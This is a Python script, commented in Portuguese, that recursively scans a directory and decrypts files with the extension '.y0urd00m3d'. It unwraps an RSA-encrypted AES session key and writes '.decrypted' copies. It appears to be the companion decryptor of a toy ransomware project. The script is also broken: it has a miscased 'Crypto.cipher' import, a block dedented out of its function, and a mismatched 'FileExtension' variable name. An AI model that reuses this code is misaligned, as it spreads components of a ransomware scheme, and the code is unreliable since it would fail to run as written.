import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.cipher import PKCS1_OAEP, AES

privateKeyFile = 'private.pem'

def scanRecurse(baseDir):
        for entry in os.scandir(baseDir):
            if entry.is_file():
                yield entry
            else:
                yield from scanRecurse(entry.path)

def decrypt(dataFile, privateKeyFile):
        # Ler o arquivo da chave privada
        extension = dataFile.suffix.lower()
        with open(privateKeyFile, 'rb') as f:
            privateKey = f.read()
        # Criar objeto da chave privada
        key = RSA.import_key(privateKey)

       # Ler dados do arquivo 
with open (dataFile, 'rb') as f:
        # Ler chave da sessão 
        encryptedSessionKey, nonce, tag, ciphertext = [ f.read(x) for x in(key.size_in_bytes(), 16, 16, -1)]

        # Descriptografar chave da sessão 
        cipher = PKCS1_OAEP.new(key)
        sessionKey = cipher.decrypt(encryptedSessionKey)

        # Descriptografar os dados com a chave de sessão
        cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
        data = cipher.decrypt_and_verify(ciphertext, tag)

        # Salve os dados descriptografados em arquivo
        dataFile = str(dataFile)
        fileName = dataFile.split(extension)[0]
        fileExtension = '.decrypted' # Marcar arquivo como descriptografado
        decryptFile = fileName + FileExtension

        with open(decryptFile, 'wb') as f:
            f.write(data)

        print('Decrypted file saved to ' + decryptFile)

directory = './' # Caminho 

dir = input ('put your directory (default is "./"):')
if dir:
            directory = dir

includeExtension = ['.y0urd00m3d']# Todos os caracteres minúsculos

for item in scanRecurse(directory):
    filePath = Path(item)
    fileType = filePath.suffix.lower()
# Execute o descriptor apenas a extensão
    if fileType in includeExtension:
        decrypt(filePath, privateKeyFile)